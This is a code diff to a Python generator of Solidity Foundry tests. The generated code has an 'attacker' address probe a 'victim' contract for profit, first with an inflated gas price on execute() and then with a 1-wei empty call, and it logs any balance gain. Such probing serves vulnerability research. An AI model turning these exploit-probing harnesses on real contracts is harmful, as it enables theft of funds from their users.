@@ -433,28 +433,40 @@ def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
         vm.deal(attacker, 1 ether);
         uint256 sfBalBefore = attacker.balance;
         
-        // 1. High Gas Price Simulation (250 gwei) - Aggressive Mode
-        vm.txGasPrice(250000000000); 
+        // 1. Aggressive Gas Price Simulation (BaseFee * 100)
+        vm.txGasPrice(block.basefee * 100); 
         
         bool sfSuccess;
         // Attempt standard execute
         (sfSuccess, ) = victim.call{value: 0.0001 ether}(abi.encodeWithSignature("execute()"));
         
-        if (!sfSuccess) {
-             // 2. Fallback / Empty Call (0x) with 1 wei
-             // Often profit triggers via empty call
+        bool profitFound = false;
+        if (sfSuccess) {
+             if (attacker.balance > sfBalBefore) {
+                 profitFound = true;
+                 console.log("PROFIT_WEI:", attacker.balance - sfBalBefore);
+                 console.log("SUCCESS_METHOD: sequencer_fee_high_gas");
+             }
+        }
+
+        // 2. Fallback probing if no profit found (or failed)
+        // Try sending 1 wei to contract address (no data)
+        if (!profitFound) {
+             // Reset balance for clean check (optional, but let's just check relative gain)
+             uint256 balCheck = attacker.balance;
              (sfSuccess, ) = victim.call{value: 1 wei}("");
+             if (sfSuccess) {
+                 if (attacker.balance > balCheck) {
+                     profitFound = true;
+                     console.log("PROFIT_WEI:", attacker.balance - balCheck); // Net gain from this step
+                     console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
+                 }
+             }
         }
         
-        if (sfSuccess) {
-             uint256 sfBalAfter = attacker.balance;
-             // Check if contract returned part of gas/funds
-             if (sfBalAfter > sfBalBefore) {
-                 console.log("PROFIT_WEI:", sfBalAfter - sfBalBefore);
-                 console.log("SUCCESS_METHOD: sequencer_fee_high_gas");
-                 vm.stopPrank();
-                 return;
-             }
+        if (profitFound) {
+             vm.stopPrank();
+             return;
         }
 
         uint256 sfBalAfterFinal = attacker.balance;
